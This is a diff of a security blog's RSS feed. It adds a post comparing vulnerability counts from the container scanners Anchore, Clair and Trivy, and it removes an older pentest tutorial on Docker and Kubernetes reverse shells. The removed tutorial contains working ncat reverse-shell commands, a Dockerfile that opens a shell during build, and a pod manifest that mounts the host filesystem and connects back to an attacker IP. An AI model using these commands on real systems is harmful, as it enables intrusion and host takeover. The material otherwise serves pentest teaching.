@@ -7,6 +7,132 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Container Vulnerability Scanning Fun</title>
+				<description>&lt;p&gt;Vulnerability Assessment is one of those foundational IT Security tasks that often gets overlooked or thought to be reasonably straightforward, where you can actually find some interesting complications that make it trickier than expected.&lt;/p&gt;
+
+&lt;p&gt;Generally, most companies will include VA as part of their overall operational security processes, looking to assure that the software they’re deploying is relatively free of unpatched security vulnerabilities.&lt;/p&gt;
+
+&lt;p&gt;This post will look a bit at how assessing vulnerabilities of container images for outdated operating system packages is handled and some things to be aware of. We’ll exclude Windows container images to keep things (relatively) straightforward and stick to operating system level vulnerabilities.&lt;/p&gt;
+
+&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;Most Docker images are based on specific Linux distributions and make use of the package managers that those distributions provide to deploy software like tooling and libraries that support the application running in containers based on that image.&lt;/p&gt;
+
+&lt;p&gt;So if we’re looking to assess whether there are known vulnerabilities in our images, it would seem possible to use the data provided by the distributions about package versions and CVEs that are patched in them, to assess whether a given image has unpatched vulnerabilities, so far … so simple!&lt;/p&gt;
+
+&lt;h2 id=&quot;tooling&quot;&gt;Tooling&lt;/h2&gt;
+
+&lt;p&gt;To take a practical look at how this works, we can use some of the Open Source container vulnerability scanning tools that are available.  For this post we’ll look at three&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/anchore/anchore-engine&quot;&gt;Anchore Engine&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/quay/clair&quot;&gt;Clair&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/aquasecurity/trivy&quot;&gt;Trivy&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For the examples below, I set up all three scanners to run locally (e.g. without setting up a container registry).  For Anchore I used their Docker compose file and &lt;a href=&quot;https://github.com/anchore/anchore-cli&quot;&gt;Ancore CLI&lt;/a&gt;, for clair I used &lt;a href=&quot;https://github.com/arminc/clair-local-scan&quot;&gt;clair-local-scan&lt;/a&gt; and for Trivy, I just used the binary as it comes from their repo. A side note on these is that, from the perspective of setup processes for standalone usage, Trivy is by far the easiest to get working.&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning-common-base-images&quot;&gt;Scanning Common Base Images&lt;/h2&gt;
+
+&lt;p&gt;So now we’ve got three scanners setup, let’s take a look at some common base images and see what they come up with. All three tools provide a JSON output option, so we can use that to create parseable results for analysis.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;TL;DR.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;If you don’t want to read down a couple of points to note&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Despite the task seeming relatively simple, even in base images different container vulnerability scanners produce quite different results&lt;/li&gt;
+  &lt;li&gt;The scanning engines support different sets of base images, so that should be noted when you’re assessing which one to use&lt;/li&gt;
+  &lt;li&gt;Even in a fully updated base image, there can still be outstanding CVEs, depending on the update cycle of both Docker Hub and the underlying distribution.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Summary of Vulnerability Numbers&lt;/strong&gt;
+|   |Ubuntu:18.04|Ubuntu:20.04|Debian:stable|Centos:8|
+|—|—|—|—|—|
+|Anchore|71|23|47|74|
+|Clair|38|0|89|1|
+|Trivy|73|26|88|N/A|&lt;/p&gt;
+
+&lt;h1 id=&quot;result-details&quot;&gt;Result Details&lt;/h1&gt;
+
+&lt;h2 id=&quot;ubuntu1804&quot;&gt;Ubuntu:18.04&lt;/h2&gt;
+
+&lt;p&gt;This is a very commonly used base image.  We’re using the latest version with that tag from Docker Hub.  First question is, when we scan this image, how many vulnerabilities does each scanner think we have?&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Vulnerability Count&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore thinks the vuln count is : 71
+Clair thinks the vuln count is : 38
+Trivy thinks the vuln count is : 73
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is moderately interesting already.  If you’re using an updated image from Docker Hub, you might think there would be no unpatched issues, but you’d be wrong. One interesting piece about these issue counts is that (in this case) it turns out that the CVEs referenced are the same but that some of the scanners have multiple vulnerabilities for a single CVE.&lt;/p&gt;
+
+&lt;p&gt;Next question, what severity do the various scanners apply to these vulnerabilities&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Vulnerability Severities&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Low&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;31, &lt;span class=&quot;s2&quot;&gt;&quot;Negligible&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;23, &lt;span class=&quot;s2&quot;&gt;&quot;Medium&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;17&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+Clair Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Medium&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;11, &lt;span class=&quot;s2&quot;&gt;&quot;Low&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;20, &lt;span class=&quot;s2&quot;&gt;&quot;Negligible&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;7&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+Trivy Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LOW&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;55, &lt;span class=&quot;s2&quot;&gt;&quot;MEDIUM&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;18&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Some relatively major differences there too.&lt;/p&gt;
+
+&lt;h2 id=&quot;ubuntu2004&quot;&gt;Ubuntu:20.04&lt;/h2&gt;
+
+&lt;p&gt;Lets try the newest stable release of Ubuntu and see what that shows up. Here, Clair doesn’t notice any issues whilst both Anchore and Trivy report over twenty&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Vulnerability Count&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore thinks the vuln count is : 23
+Clair thinks the vuln count is : 0
+Trivy thinks the vuln count is : 26
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;On severities, Trivy includes a high, where all of Anchore’s severities are medium or low.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Vulnerability Severities&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Low&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;11, &lt;span class=&quot;s2&quot;&gt;&quot;Negligible&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;5, &lt;span class=&quot;s2&quot;&gt;&quot;Medium&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;7&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+Clair Severity Counts : &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;
+Trivy Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MEDIUM&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;9, &lt;span class=&quot;s2&quot;&gt;&quot;LOW&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;16, &lt;span class=&quot;s2&quot;&gt;&quot;HIGH&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;debianstable&quot;&gt;Debian:stable&lt;/h2&gt;
+
+&lt;p&gt;Here the numbers are switched around again with Clair and Trivy reporting quite a few more issues than Anchore. An interesting point is that whilst Clair and Trivy’s total vulnerability counts are similar, the referenced CVEs have quite a few differences.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Vulnerability Count&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore thinks the vuln count is : 47
+Clair thinks the vuln count is : 89
+Trivy thinks the vuln count is : 88
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Negligible&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;46, &lt;span class=&quot;s2&quot;&gt;&quot;Medium&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+Clair Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Low&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;21, &lt;span class=&quot;s2&quot;&gt;&quot;Negligible&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;45, &lt;span class=&quot;s2&quot;&gt;&quot;Unknown&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;23&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+Trivy Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LOW&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;69, &lt;span class=&quot;s2&quot;&gt;&quot;MEDIUM&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;17, &lt;span class=&quot;s2&quot;&gt;&quot;HIGH&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;centos8&quot;&gt;Centos:8&lt;/h2&gt;
+
+&lt;p&gt;Another commonly used base image here the results are interesting, in that Trivy doesn’t recognize the OS at all and Anchore comes out with a lot more vulnerabilities than Clair.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Vulnerability Count&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore thinks the vuln count is : 74
+Clair thinks the vuln count is : 1
+Trivy thinks the vuln count is : 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Vulnerability Severities&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Low&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;23, &lt;span class=&quot;s2&quot;&gt;&quot;High&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;4, &lt;span class=&quot;s2&quot;&gt;&quot;Medium&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;47&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+Clair Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;High&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+Trivy Severity Counts : &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+				<pubDate>Sun, 21 Jun 2020 16:10:39 +0100</pubDate>
+				<link>/blog/2020/06/21/Container_Vulnerability_Scanning_Fun/</link>
+				<guid isPermaLink="true">/blog/2020/06/21/Container_Vulnerability_Scanning_Fun/</guid>
+			</item>
+		
+			<item>
 				<title>Custom Pentest Distributions using WSL2</title>
 				<description>&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 
@@ -704,97 +830,6 @@ spec:
 				<pubDate>Sat, 10 Aug 2019 07:10:39 +0100</pubDate>
 				<link>/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/</link>
 				<guid isPermaLink="true">/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/</guid>
-			</item>
-		
-			<item>
-				<title>Docker and Kubernetes Reverse shells</title>
-				<description>&lt;p&gt;A handy technique for any pentester is the ability to create a reverse shell. This allows for a variety of cases where you want to get access to restricted environments or want to extract information from a remote system.&lt;/p&gt;
-
-&lt;p&gt;There’s a number of scenarios where this can apply to containerized environments, here’s a couple with the steps that could be used to setup a reverse shell using &lt;a href=&quot;https://nmap.org/ncat/&quot;&gt;ncat&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;reverse-shell-from-docker-run&quot;&gt;Reverse shell from docker run&lt;/h2&gt;
-
-&lt;p&gt;Here we want to push a reverse shell back from a machine that we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run&lt;/code&gt; access to, this one is pretty simple&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
-We just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -l -p 8989
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;
-Here we just need a Docker image that has ncat available. I’ve got one &lt;a href=&quot;https://cloud.docker.com/u/raesene/repository/docker/raesene/ncat&quot;&gt;here&lt;/a&gt; on Docker hub.&lt;/p&gt;
-
-&lt;p&gt;So we just run this image with ncat parameters to connect back to the pentester machine on 192.168.200.1&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/ncat 192.168.200.1 8989 -e /bin/sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reverse-shell-from-a-dockerfile&quot;&gt;Reverse Shell from a Dockerfile&lt;/h2&gt;
-
-&lt;p&gt;So in our next scenario we’ve got the ability to get our Target Machine to do a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker build&lt;/code&gt; on a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt; that we control.  This is common in places where there are CI/CD processes like Jenkins or Drone, or cloud container building services.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
-Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Here we need to construct our Dockerfile to pass into the process, this one should work based on a base ubuntu:18.04 image&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04
-
-RUN apt update &amp;amp;&amp;amp; apt install -y nmap
-
-RUN ncat 192.168.200.1 8989 -e /bin/sh
-
-CMD [&quot;/bin/bash&quot;]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;when the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker build&lt;/code&gt; command is executed, the reverse shell will pop during the build process.&lt;/p&gt;
-
-&lt;h2 id=&quot;kubernetes-cluster&quot;&gt;Kubernetes Cluster&lt;/h2&gt;
-
-&lt;p&gt;So say you’ve got a Kubernetes cluster where you can create pods but otherwise your rights are limited, and you’d like to get a shell inside the cluster.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
-Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Target Cluster&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;So we just need a Pod manifest that will open a reverse shell on your pentester machine when created.  The example below will create that kind of pod and additionally will mount the hosts root filesystem into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/host&lt;/code&gt;, although this will fail if a restrictive &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PodSecurityPolicy&lt;/code&gt; is in place.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
-kind: Pod
-metadata:
-  name: ncat-reverse-shell-pod
-  labels:
-    app: ncat
-spec:
-  containers:
-  - name: ncat-reverse-shell
-    image: raesene/ncat
-    volumeMounts:
-    - mountPath: /host
-      name: hostvolume
-    args: ['192.168.200.1', '8989', '-e', '/bin/bash']
-  volumes:
-  - name: hostvolume
-    hostPath:
-      path: /
-      type: Directory
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;For extra credit you could mount in the Docker socket from the underlying host and then break out relatively easily&lt;/p&gt;
-</description>
-				<pubDate>Fri, 09 Aug 2019 10:10:39 +0100</pubDate>
-				<link>/blog/2019/08/09/docker-reverse-shells/</link>
-				<guid isPermaLink="true">/blog/2019/08/09/docker-reverse-shells/</guid>
 			</item>
 		
 	</channel>
